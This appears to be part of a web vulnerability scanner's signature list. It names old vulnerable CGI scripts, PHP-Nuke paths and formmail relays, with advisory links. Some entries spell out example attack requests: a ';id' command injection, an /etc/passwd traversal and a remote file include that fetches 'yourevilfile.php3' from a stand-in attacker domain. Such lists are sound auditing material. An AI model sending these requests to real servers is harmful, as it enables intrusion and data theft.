+/cgi-bin/viralator.cgi!Possible command execution!http://online.securityfocus.com/archive/1/224151
+/phpnuke/!Server has phpnuke directory!
+/php_nuke/!Server has phpnuke directory!
+/demo/!Server has demo directory!
+/nuke/!Server has nuke directory!
+/php/!Server has php directory!
+/phpnew/!Server has phpnew directory!
+/nuke50/!Server has nuke50 directory!
+/modules.php!Try http://www.somehost.com/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid!
+/formmail/formmail.pl!Allows sending mail via that domain!http://www.securityfocus.com/cgi-bin/archive.pl?id=75&mid=211491
+/cgi-bin/formmail/formmail.pl!Allows sending mail via that domain!http://www.securityfocus.com/cgi-bin/archive.pl?id=75&mid=211491
+/VBZooM/!Server has VBZooM directory, allows uploading of evil files!
+/DirWalkR.asp!Walk through Directories, DOH!
+/ServerVars.asp!Displays lots of information!
+/phptonuke.php!Try http://www.somehost.com/phptonuke.php?filnavn=/etc/passwd!
+/gb/index.php!Try http://www.somehost.com/gb/index.php?login=true to login!
+/variables.php3!Try http://www.somehost.com/variables.php3?Include=http://yourdomain/yourevilfile.php3!
+/cgi-bin/virgil.cgi!Allows executing arbitrary commands as httpd UID!http://online.securityfocus.com/archive/1/296635
+/cgi-bin/virgil/virgil.cgi!Allows executing arbitrary commands as httpd UID!http://online.securityfocus.com/archive/1/296635
+/cgi-bin/helpout.exe!Websphere Denial of service!http://www.cgisecurity.com/archive/webservers/websphere-edge-v4.x-3.v-server-cache-dos.txt
+/cgi-bin/viewAttachment.cgi!View any file on the system that can be read by the UID of the webserver!http://www.nth-dimension.org.uk/pub/NDSA20021112.txt.asc
